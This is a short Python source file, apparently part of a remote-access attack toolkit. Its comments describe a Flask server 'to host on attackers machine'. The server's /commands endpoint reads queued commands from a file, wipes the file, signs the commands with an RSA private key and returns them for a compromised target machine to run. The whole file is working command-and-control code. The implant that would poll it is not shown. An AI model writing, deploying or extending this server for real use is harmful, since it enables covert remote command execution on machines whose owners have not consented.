# flask server to host on attackers machine
# Provides an endpoint which will return a list of commands to run on the target machine

import flask
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Signature import pkcs1_15
from base64 import b64encode

app = flask.Flask(__name__)

file_path = "commands.txt"
private_key_name = "private.pem"
public_key_name = "public.pem"

def sign_message(message):
    # Signing function from 
    # https://blog.epalm.ca/signing-and-verifying-with-rsa-keys/

    # sign commands with private key
    private_key = RSA.importKey(open(private_key_name, 'r').read())

    digest = SHA256.new(message.encode())

    signature = pkcs1_15.new(private_key).sign(digest)

    public_key = RSA.importKey(open(public_key_name, 'r').read())

    pkcs1_15.new(public_key).verify(digest, signature)

    signature_b64 = b64encode(signature)

    return signature_b64


@app.route('/commands', methods=['GET'])
def commands():
    # return commands from file to run on target machine
    with open(file_path, 'r') as f:
        commands = f.read()

    # deletes commands from file after they are read
    with open(file_path, 'w') as f:
        f.write('')

    print("Commands are", commands)

    signed_message = sign_message(commands)

    return flask.jsonify(signature=signed_message.decode("utf-8"), message=commands)